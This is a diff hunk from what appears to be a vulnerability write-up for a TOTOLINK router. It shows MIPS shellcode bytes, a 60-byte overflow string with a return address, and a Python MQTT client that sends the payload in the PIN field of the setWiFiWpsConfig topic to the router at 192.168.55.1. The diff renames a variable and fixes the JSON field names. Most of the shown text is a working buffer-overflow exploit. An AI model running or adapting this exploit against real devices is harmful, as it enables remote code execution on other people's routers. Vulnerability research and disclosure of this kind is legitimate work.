@@ -54,11 +54,11 @@ buf += "\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf"
 buf += "\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24"
 buf += "\x0c\x01\x01\x01"
 
-test = "a"*60 + "\x44\x03\x42"
+pay = "a"*60 + "\x44\x03\x42"
 
 client = mqtt.Client()
 client.connect("192.168.55.1",1883,60)
-client.publish('totolink/router/setting/setWiFiWpsConfig',payload='{"topicurl":"setting/setWiFiWpsConfig","WiFiIdx":"0","PINPBCRadio":"1","PINMode":"1","PIN":"'+test+'"}'+'bling'+buf)
+client.publish('totolink/router/setting/setWiFiWpsConfig',payload='{"topicurl":"setting/setWiFiWpsConfig","wifiIdx":"0","wscMode":"1","wscPinMode":"1","pin":"'+pay+'"}'+'bbbbb'+buf)
 ```
 **PS:**
 The offset maybe different in each device. <br>
